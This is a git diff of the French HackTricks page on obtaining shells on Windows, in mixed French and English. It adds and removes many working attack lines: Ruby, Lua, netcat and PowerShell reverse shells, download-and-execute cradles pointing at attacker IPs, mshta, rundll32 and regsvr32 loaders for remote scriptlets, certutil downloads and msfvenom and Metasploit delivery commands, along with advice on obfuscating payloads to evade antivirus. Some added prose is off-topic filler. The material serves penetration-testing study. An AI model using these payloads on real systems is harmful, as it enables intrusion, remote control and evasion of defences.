@@ -4,7 +4,7 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -12,12 +12,12 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof est la plateforme des primes de bugs cryptographiques.**
 
 **Obtenez des récompenses sans délai**\
-Les primes HackenProof ne sont lancées que lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.
+Les primes HackenProof ne sont lancées que lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.
 
 **Acquérez de l'expérience en pentesting web3**\
 Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.
@@ -98,7 +98,49 @@ En utilisant ces ressources, vous pouvez approfondir vos connaissances en Ruby e
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
-Lua est un langage de programmation léger, extensible et puissant. Il est souvent utilisé dans le développement de jeux vidéo et d'applications embarquées. Lua est facile à apprendre et à intégrer dans d'autres langages, ce qui en fait un choix populaire parmi les développeurs. Il est également connu pour sa flexibilité et sa capacité à être utilisé comme langage de script. Lua offre une syntaxe simple et concise, ce qui facilite la lecture et la compréhension du code. Il est compatible avec de nombreuses plates-formes, y compris Windows.
+## Lua
+
+Lua est un langage de programmation léger, extensible et puissant. Il est souvent utilisé dans le développement de jeux vidéo et d'applications embarquées. Lua est également utilisé comme langage de script dans diverses applications et environnements.
+
+### Installation de Lua
+
+Pour commencer à utiliser Lua, vous devez d'abord l'installer sur votre système. Voici les étapes pour installer Lua sur Windows :
+
+1. Téléchargez le programme d'installation de Lua à partir du site officiel de Lua (https://www.lua.org/download.html).
+2. Exécutez le programme d'installation et suivez les instructions à l'écran.
+3. Choisissez le répertoire d'installation souhaité et cliquez sur "Suivant".
+4. Sélectionnez les composants à installer (par défaut, tous les composants sont sélectionnés) et cliquez sur "Suivant".
+5. Choisissez le nom du dossier de démarrage dans le menu Démarrer et cliquez sur "Installer".
+6. Attendez que l'installation soit terminée, puis cliquez sur "Terminer".
+
+### Utilisation de Lua
+
+Une fois que Lua est installé, vous pouvez l'utiliser en ouvrant une invite de commandes et en exécutant la commande `lua`. Cela lancera l'interpréteur Lua, où vous pouvez saisir du code Lua et l'exécuter.
+
+Voici un exemple simple de code Lua :
+
+```lua
+print("Bonjour, Lua !")
+```
+
+Pour exécuter ce code, enregistrez-le dans un fichier avec l'extension `.lua`, puis exécutez la commande `lua` suivie du nom du fichier :
+
+```
+lua mon_script.lua
+```
+
+Le code sera exécuté et vous verrez la sortie "Bonjour, Lua !" dans la console.
+
+### Ressources supplémentaires
+
+Lua dispose d'une documentation complète et de nombreuses ressources en ligne pour vous aider à apprendre et à utiliser le langage. Voici quelques ressources utiles :
+
+- Site officiel de Lua : https://www.lua.org/
+- Tutoriels Lua : https://www.lua.org/start.html
+- Livres sur Lua : https://www.lua.org/gems/
+- Communauté Lua : https://www.lua.org/community.html
+
+Utilisez ces ressources pour approfondir vos connaissances en Lua et explorer les nombreuses possibilités offertes par ce langage de programmation puissant.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -116,45 +158,55 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo wil
 
 In the context of penetration testing, a shell is a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on Windows systems.
 
-## Methodologies
+## Netcat
 
-### 1. Remote Desktop Protocol (RDP)
+Netcat is a versatile networking utility that can be used to establish a reverse shell on a Windows machine. The basic idea is to listen for incoming connections on the attacker's machine and redirect the shell to that machine.
 
-RDP is a proprietary protocol developed by Microsoft that allows a user to connect to a remote system over a network connection. If RDP is enabled on the target system and the attacker has valid credentials, they can use RDP to gain remote access and obtain a shell.
+To set up a reverse shell using Netcat, follow these steps:
 
-### 2. Exploiting Vulnerabilities
+1. On the attacker's machine, open a terminal and start listening for incoming connections:
 
-Exploiting vulnerabilities in Windows systems is a common method to gain unauthorized access. By identifying and exploiting vulnerabilities in the target system, an attacker can execute arbitrary code and gain a shell.
+   ```bash
+   nc -lvp <port>
+   ```
 
-### 3. Social Engineering
+2. On the victim's machine, execute the following command to establish a connection with the attacker's machine:
 
-Social engineering involves manipulating individuals to gain unauthorized access to a system. By tricking a user into running malicious code or disclosing sensitive information, an attacker can gain access to the system and obtain a shell.
+   ```bash
+   nc <attacker_ip> <port> -e cmd.exe
+   ```
 
-### 4. Malware
+   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
 
-Malware, such as trojans or backdoors, can be used to gain unauthorized access to a system. By infecting the target system with malware, an attacker can establish a connection and obtain a shell.
+3. Once the connection is established, the attacker will have a shell on the victim's machine.
 
-## Resources
+## PowerShell
 
-### 1. Metasploit Framework
+PowerShell is a powerful scripting language and command-line shell that is built into Windows. It provides a wide range of functionalities for system administration and automation. In the context of penetration testing, PowerShell can be used to execute commands on a compromised Windows system.
 
-Metasploit Framework is a powerful tool for penetration testing and exploitation. It provides a wide range of exploits and payloads that can be used to gain shells on Windows systems.
+To obtain a shell using PowerShell, follow these steps:
 
-### 2. Cobalt Strike
+1. On the victim's machine, open a PowerShell session.
 
-Cobalt Strike is a commercial penetration testing tool that includes features for post-exploitation, including the ability to gain shells on compromised Windows systems.
+2. Execute the following command to enable remote command execution:
 
-### 3. PowerShell Empire
+   ```powershell
+   Set-ExecutionPolicy Bypass -Scope Process -Force
+   ```
 
-PowerShell Empire is a post-exploitation framework that allows an attacker to gain shells on Windows systems using PowerShell. It provides a variety of modules and techniques for maintaining persistence and evading detection.
+3. Execute the following command to establish a reverse shell with the attacker's machine:
 
-### 4. Covenant
+   ```powershell
+   powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+   ```
 
-Covenant is a .NET-based command and control framework that allows an attacker to gain shells on compromised Windows systems. It provides a user-friendly interface and a wide range of features for post-exploitation.
+   Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.
+
+4. Once the connection is established, the attacker will have a shell on the victim's machine.
 
 ## Conclusion
 
-Gaining a shell on a Windows system is a crucial step in the penetration testing process. By using the methodologies and resources mentioned in this section, an attacker can effectively gain unauthorized access and maintain control over a compromised system.
+Obtaining a shell on a Windows system is a crucial step in the penetration testing process. By using tools like Netcat and PowerShell, an attacker can gain control over a compromised system and perform further actions to achieve their objectives. It is important to note that these techniques should only be used for ethical purposes and with proper authorization.
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -168,30 +220,31 @@ Powershell est un puissant langage de script et une interface en ligne de comman
 
 ### Utilisation de Powershell pour l'exploitation
 
-Powershell peut également être utilisé par les hackers pour l'exploitation des systèmes Windows. Il offre un large éventail de fonctionnalités qui peuvent être utilisées pour exécuter des commandes malveillantes, accéder à des informations sensibles et compromettre la sécurité des systèmes.
+Powershell peut également être utilisé par les hackers pour mener des attaques et exploiter les systèmes Windows. En raison de sa puissance et de sa flexibilité, Powershell est souvent utilisé pour exécuter des scripts malveillants, voler des informations sensibles et compromettre la sécurité des systèmes.
 
-#### Exécution de commandes malveillantes
+### Techniques d'exploitation avec Powershell
 
-Powershell permet aux hackers d'exécuter des commandes malveillantes sur des systèmes Windows compromis. Ils peuvent utiliser des scripts Powershell pour exécuter des actions telles que l'installation de logiciels malveillants, la suppression de fichiers, la modification des paramètres système, etc.
+Il existe plusieurs techniques d'exploitation couramment utilisées avec Powershell, notamment :
 
-#### Accès à des informations sensibles
+- **Injection de code Powershell** : Les hackers peuvent injecter du code Powershell malveillant dans des fichiers ou des processus légitimes pour contourner les mesures de sécurité et exécuter des commandes à distance.
 
-En exploitant les fonctionnalités de Powershell, les hackers peuvent accéder à des informations sensibles stockées sur des systèmes Windows. Ils peuvent extraire des mots de passe, des informations d'identification, des données personnelles, etc. en utilisant des commandes Powershell spécifiques.
+- **Téléchargement et exécution de scripts malveillants** : Les hackers peuvent utiliser Powershell pour télécharger et exécuter des scripts malveillants à partir de serveurs distants, leur permettant ainsi de prendre le contrôle du système cible.
 
-#### Compromission de la sécurité des systèmes
+- **Utilisation de modules Powershell malveillants** : Les hackers peuvent utiliser des modules Powershell malveillants pour effectuer des actions malveillantes telles que l'exfiltration de données, l'escalade de privilèges et la création de backdoors.
 
-Powershell peut également être utilisé pour compromettre la sécurité des systèmes Windows. Les hackers peuvent utiliser des techniques telles que l'injection de code malveillant dans des scripts Powershell légitimes, l'exploitation de vulnérabilités connues dans Powershell, etc. pour compromettre la sécurité des systèmes.
+### Contre-mesures
 
-### Prévention et détection de l'utilisation malveillante de Powershell
+Pour se protéger contre les attaques utilisant Powershell, il est recommandé de prendre les mesures suivantes :
 
-Pour prévenir et détecter l'utilisation malveillante de Powershell, il est recommandé de prendre les mesures suivantes :
+- **Mettre en place des politiques de sécurité strictes** : Définir des politiques de sécurité qui limitent l'exécution de scripts Powershell non signés et restreignent l'accès aux fonctionnalités sensibles.
 
-- Restreindre l'accès à Powershell en utilisant des stratégies de groupe et des autorisations appropriées.
-- Mettre en place des mécanismes de surveillance pour détecter les activités suspectes liées à Powershell, telles que l'exécution de commandes inconnues ou l'accès à des fichiers sensibles.
-- Maintenir les systèmes Windows à jour avec les derniers correctifs de sécurité pour réduire les risques d'exploitation de vulnérabilités connues dans Powershell.
-- Sensibiliser les utilisateurs aux risques liés à l'exécution de scripts Powershell provenant de sources non fiables et les encourager à ne pas exécuter de scripts inconnus.
+- **Surveiller l'activité Powershell** : Mettre en place une surveillance de l'activité Powershell pour détecter les comportements suspects et les tentatives d'exploitation.
 
-En suivant ces mesures de prévention et de détection, il est possible de réduire les risques liés à l'utilisation malveillante de Powershell et de renforcer la sécurité des systèmes Windows.
+- **Mettre à jour régulièrement les systèmes** : S'assurer que les systèmes sont régulièrement mis à jour avec les derniers correctifs de sécurité pour réduire les vulnérabilités.
+
+- **Utiliser des solutions de sécurité avancées** : Utiliser des solutions de sécurité avancées qui peuvent détecter et bloquer les attaques utilisant Powershell, telles que les pare-feu et les outils de détection des menaces.
+
+En suivant ces contre-mesures, il est possible de réduire considérablement les risques d'exploitation des systèmes Windows utilisant Powershell.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
@@ -210,21 +263,9 @@ Charge utile écrite sur le disque : **Cache local du client WebDAV**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-Mshta is a Windows utility that allows you to execute HTML applications (HTAs) using the Microsoft HTML Application Host. HTAs are standalone applications that can be executed directly from the Windows shell without the need for a web browser.
+**Obtenez plus d'informations sur les différentes Shells Powershell à la fin de ce document**
 
-Mshta can be used as a shell for executing malicious code on a target system. It can be leveraged to bypass security measures and execute scripts or commands with elevated privileges.
-
-To use Mshta as a shell, you can create an HTA file containing your malicious code and then execute it using the following command:
-
-```
-mshta.exe <path_to_hta_file>
-```
-
-Once executed, the HTA file will run and execute the embedded code, allowing you to perform various actions on the target system.
-
-It is important to note that the use of Mshta as a shell may raise suspicion, as it is not a commonly used utility. Therefore, it is crucial to employ obfuscation techniques to hide the malicious code and avoid detection.
-
-For more information on different Powershell shells, refer to the [Powershell Shells](../shells/powershell.md) section at the end of this document.
+## Mshta
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -268,19 +309,38 @@ La technique `mshta - sct` est une méthode couramment utilisée pour exécuter 
 
 L'extension de fichier `.sct` est utilisée pour stocker le code VBScript ou JScript qui sera exécuté par `mshta.exe`. Cette extension permet de contourner les mécanismes de sécurité de Windows, car elle est considérée comme un fichier de script légitime.
 
-Pour exécuter du code malveillant à l'aide de `mshta - sct`, vous devez d'abord créer un fichier `.sct` contenant le code que vous souhaitez exécuter. Ensuite, vous devez utiliser la commande `mshta.exe` pour exécuter ce fichier `.sct`. Le code malveillant sera alors exécuté avec les privilèges de l'utilisateur en cours.
+Pour exécuter du code malveillant à l'aide de `mshta - sct`, vous devez d'abord créer un fichier `.sct` contenant le code que vous souhaitez exécuter. Ensuite, vous devez utiliser la commande `mshta.exe` pour exécuter ce fichier `.sct`.
 
-Il est important de noter que l'utilisation de cette technique peut être détectée par les antivirus et les outils de sécurité. Par conséquent, il est recommandé de prendre des mesures supplémentaires pour masquer le code malveillant et éviter la détection.
+Voici un exemple de code malveillant qui peut être exécuté à l'aide de `mshta - sct` :
 
-Voici un exemple de commande pour exécuter un fichier `.sct` malveillant avec `mshta.exe` :
+```vbscript
+<scriptlet>
+    <registration
+        description="EvilScript"
+        progid="EvilScript"
+        version="1.00"
+        classid="{AAAA1111-BBBB-CCCC-DDDD-EEEEEEEEEEEE}"
+    >
+    </registration>
+    <script language="VBScript">
+        <![CDATA[
+            Sub Run()
+                ' Code malveillant à exécuter
+            End Sub
+        ]]>
+    </script>
+</scriptlet>
+```
+
+Pour exécuter ce code malveillant, vous pouvez créer un fichier `evil.sct` contenant le code ci-dessus, puis exécuter la commande suivante :
 
 ```
-mshta.exe "file://C:/path/to/malicious.sct"
+mshta.exe evil.sct
 ```
 
-Assurez-vous de remplacer `C:/path/to/malicious.sct` par le chemin d'accès réel vers votre fichier `.sct` malveillant.
+Cela lancera `mshta.exe` qui exécutera le code malveillant contenu dans le fichier `evil.sct`.
 
-Cette technique peut être utilisée lors d'une attaque de phishing, d'une exploitation de vulnérabilité ou d'une infiltration de système. Il est essentiel de comprendre les risques associés à cette technique et de l'utiliser de manière responsable et légale.
+Il est important de noter que l'utilisation de cette technique peut être détectée par les logiciels antivirus et les outils de sécurité. Par conséquent, il est recommandé de prendre des mesures supplémentaires pour masquer le code malveillant et éviter la détection.
 ```markup
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -298,19 +358,41 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Mshta - Metasploit**
 
-Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It is often used by attackers to bypass security measures and execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `exploit/windows/browser/mshta` that can be used to exploit this vulnerability.
+Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It is often used by attackers to bypass security measures and execute malicious code. In this section, we will explore how to use Mshta with Metasploit for various hacking purposes.
 
-To use the `mshta` module in Metasploit, follow these steps:
+##### **Mshta Payloads**
 
-1. Start Metasploit by running the `msfconsole` command.
-2. Search for the `mshta` module using the `search` command: `search mshta`.
-3. Load the `mshta` module using the `use` command followed by the module name: `use exploit/windows/browser/mshta`.
-4. Set the required options for the module. You can use the `show options` command to view the available options and the `set` command to set their values.
-5. Run the exploit using the `exploit` command.
+Metasploit provides several Mshta payloads that can be used to exploit Windows systems. These payloads are designed to be executed through HTAs and can be used to gain remote access, escalate privileges, or perform other malicious activities on the target system.
 
-Once the exploit is successful, you will have a Meterpreter session on the target system, giving you full control over it. From there, you can perform various post-exploitation activities, such as privilege escalation, lateral movement, and data exfiltration.
+To generate an Mshta payload, you can use the `mshta` module in Metasploit. This module allows you to specify the HTA file and the payload to be executed. Once the payload is generated, you can deliver it to the target system using various methods such as email, social engineering, or exploiting vulnerabilities in web applications.
 
-It is important to note that using Metasploit or any other hacking tool without proper authorization is illegal and unethical. Always ensure that you have the necessary permissions and legal rights before conducting any penetration testing activities.
+##### **Executing Mshta Payloads**
+
+To execute an Mshta payload, you need to deliver the HTA file to the target system and then trigger its execution. There are several ways to deliver the HTA file, including:
+
+- Hosting the HTA file on a web server and tricking the target user into visiting the URL.
+- Sending the HTA file as an email attachment and convincing the target user to open it.
+- Exploiting a vulnerability in a web application to upload the HTA file to the target system.
+
+Once the HTA file is delivered, you can trigger its execution by double-clicking on it or by using the `mshta` command in the Windows command prompt. The payload will then be executed, and you will have remote access to the target system.
+
+##### **Bypassing Security Measures**
+
+Mshta can be used to bypass security measures such as antivirus software and application whitelisting. Since Mshta is a legitimate utility in Windows, it is often allowed to execute without raising any alarms. Attackers can take advantage of this to execute malicious code and gain unauthorized access to systems.
+
+To bypass security measures, attackers can obfuscate the Mshta payload to make it more difficult to detect. This can be done by encrypting the payload, using obfuscation techniques, or embedding the payload within legitimate HTML code.
+
+##### **Countermeasures**
+
+To protect against Mshta-based attacks, it is important to implement the following countermeasures:
+
+- Keep your operating system and applications up to date with the latest security patches.
+- Use a reliable antivirus software and keep it updated.
+- Implement application whitelisting to only allow trusted applications to execute.
+- Educate users about the risks of opening email attachments or visiting suspicious websites.
+- Regularly monitor and analyze system logs for any suspicious activities.
+
+By following these countermeasures, you can reduce the risk of falling victim to Mshta-based attacks and protect your systems from unauthorized access.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -356,23 +438,21 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Rundll32 - Metasploit**
 
-Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be exploited by an attacker to execute malicious code on a target system.
+Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be exploited by an attacker to execute malicious code. Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32, allowing the attacker to gain control over the target system.
 
-Metasploit, a popular penetration testing framework, provides a module called `windows/local/hta` that can be used to generate a malicious HTA file. This file can then be executed using Rundll32 to achieve code execution on the target system.
+To use this technique, follow these steps:
 
-To use this module, follow these steps:
+1. Generate the malicious HTA file using the `windows/local/hta` module in Metasploit.
+2. Transfer the HTA file to the target system.
+3. Execute the HTA file using Rundll32 with the following command:
 
-1. Start Metasploit by running the `msfconsole` command.
-2. Search for the `windows/local/hta` module using the `search` command.
-3. Load the module using the `use` command followed by the module name.
-4. Set the required options using the `set` command. These options include the `LHOST` (attacker's IP address) and `LPORT` (attacker's listening port).
-5. Generate the malicious HTA file using the `generate` command.
-6. Transfer the generated HTA file to the target system.
-7. Execute the HTA file using Rundll32 on the target system.
+```
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://<attacker_ip>/payload.hta");
+```
 
-Once the HTA file is executed, the attacker will have a Meterpreter session on the target system, allowing them to perform various post-exploitation activities.
+Replace `<attacker_ip>` with the IP address of the machine running the Metasploit framework.
 
-It is important to note that the use of Rundll32 for executing malicious code may trigger antivirus alerts. Therefore, it is recommended to use appropriate evasion techniques to bypass antivirus detection.
+By executing the HTA file with Rundll32, the attacker can run arbitrary code on the target system and gain control over it. This technique can be used to escalate privileges, install backdoors, or perform other malicious activities. It is important to note that this technique may trigger antivirus alerts, so additional evasion techniques may be necessary to bypass detection.
 ```bash
 use windows/smb/smb_delivery
 run
@@ -460,34 +540,23 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Regsvr32 - Metasploit**
 
-Regsvr32 is a Windows command-line utility used to register and unregister DLL files. It can also be used to execute arbitrary code. In the context of Metasploit, Regsvr32 can be leveraged to bypass application whitelisting and execute malicious code on a target system.
+Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system.
 
-To use Regsvr32 with Metasploit, follow these steps:
+Metasploit, a popular penetration testing framework, provides a module called `regsvr32_command_delivery` that leverages this technique to deliver a payload to a target system.
 
-1. Generate a payload using Metasploit's `msfvenom` tool. For example, to generate a reverse shell payload:
+To use this module, follow these steps:
 
-   ```
-   msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f dll > payload.dll
-   ```
+1. Start Metasploit by running the `msfconsole` command.
+2. Search for the `regsvr32_command_delivery` module using the `search` command.
+3. Load the module using the `use` command followed by the module name.
+4. Set the required options, such as the `LHOST` (local host) and `LPORT` (local port) parameters.
+5. Run the module using the `exploit` command.
 
-2. Transfer the generated payload to the target system.
+Once the module is executed, it will generate a malicious DLL file and a corresponding script. The script will register the DLL file using the `regsvr32` command, triggering the execution of the payload on the target system.
 
-3. On the target system, use Regsvr32 to execute the payload:
+This technique can be useful for bypassing security measures that may block traditional executable files, as DLL files are often considered safe.
 
-   ```
-   regsvr32 /s /n /u /i:<path to payload.dll>
-   ```
-
-   - `/s` - Silent mode, no dialog boxes will be displayed.
-   - `/n` - Do not call DllRegisterServer.
-   - `/u` - Unregister the DLL file.
-   - `/i` - Specify the path to the DLL file.
-
-   Note: The `/i` flag is used to specify the path to the DLL file, but it is not necessary for the payload to be registered.
-
-4. The payload will be executed, establishing a reverse shell connection to the attacker's machine.
-
-Regsvr32 can be a powerful tool for bypassing application whitelisting and executing arbitrary code on a target system. However, it is important to note that its usage may raise suspicion, as it is not a commonly used utility. Therefore, it is crucial to use it in a stealthy manner and to ensure that the payload is properly obfuscated to avoid detection.
+It is important to note that the success of this technique depends on the target system's configuration and security measures in place.
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -510,9 +579,9 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```
 **Détecté par le défenseur**
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-**HackenProof est le lieu de tous les programmes de primes pour les bugs de crypto.**
+**HackenProof est le lieu de tous les programmes de primes pour les bugs de cryptographie.**
 
 **Obtenez des récompenses sans délai**\
 Les primes HackenProof sont lancées uniquement lorsque leurs clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.
@@ -533,17 +602,17 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```
 **Cscript - Metasploit**
 
-Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems. Metasploit, on the other hand, is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules.
+Cscript is a command-line scripting engine provided by Microsoft for running scripts written in VBScript or JScript. It is commonly used for administrative tasks and automation on Windows systems.
 
-When it comes to exploiting Windows systems, Metasploit provides several modules that leverage the Cscript engine to execute malicious scripts. These modules allow an attacker to run arbitrary code on a target system by taking advantage of vulnerabilities in the Cscript engine or by using social engineering techniques to trick the user into running a malicious script.
+Metasploit is a powerful penetration testing framework that includes a wide range of exploits, payloads, and auxiliary modules. It is widely used by security professionals to test the security of computer systems.
 
-One such module is the `exploit/windows/script/web_delivery` module, which generates a malicious VBScript or JScript payload and delivers it to the target system through a web server. The payload is executed using the Cscript engine, allowing the attacker to gain remote access to the target system.
+When it comes to exploiting Windows systems using Metasploit, Cscript can be a useful tool. By leveraging Cscript, you can execute VBScript or JScript code on a target Windows machine, allowing you to perform various actions, such as executing commands, manipulating files, or even establishing a remote shell.
 
-Another module is the `exploit/windows/fileformat/cve_2017_0199_rtf` module, which exploits a vulnerability in Microsoft Office to execute arbitrary code. This module uses a specially crafted RTF file that contains a malicious script, which is executed using the Cscript engine when the file is opened.
+To use Cscript with Metasploit, you can create a malicious script using VBScript or JScript that contains the desired payload or exploit. Once the script is created, you can use Metasploit's `exploit/windows/local/script/web_delivery` module to generate a URL that will deliver the script to the target machine.
 
-To use these modules, the attacker needs to set the appropriate options, such as the payload type, the target IP address, and the listening address for the reverse shell. Once the options are configured, the attacker can run the exploit and wait for the target system to execute the malicious script.
+When the target user visits the URL, the script will be executed by Cscript on their machine, triggering the desired payload or exploit. This can be a powerful technique for gaining remote access to a Windows system or performing other malicious activities.
 
-It is important to note that using these modules for unauthorized access to systems is illegal and unethical. They should only be used for legitimate purposes, such as penetration testing or security research, with proper authorization.
+It is important to note that using Cscript with Metasploit requires careful planning and consideration of the target environment. It is crucial to ensure that you have proper authorization and legal permission before attempting any penetration testing or exploitation activities.
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
@@ -718,7 +787,7 @@ Démarrez msfconsole avec la ressource créée:
 ```
 msfconsole -r unicorn.rc
 ```
-Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
+Démarrez un serveur web servant le fichier _powershell\_attack.txt_ et exécutez-le sur la victime :
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -741,7 +810,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS avec quelques modul
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**
 
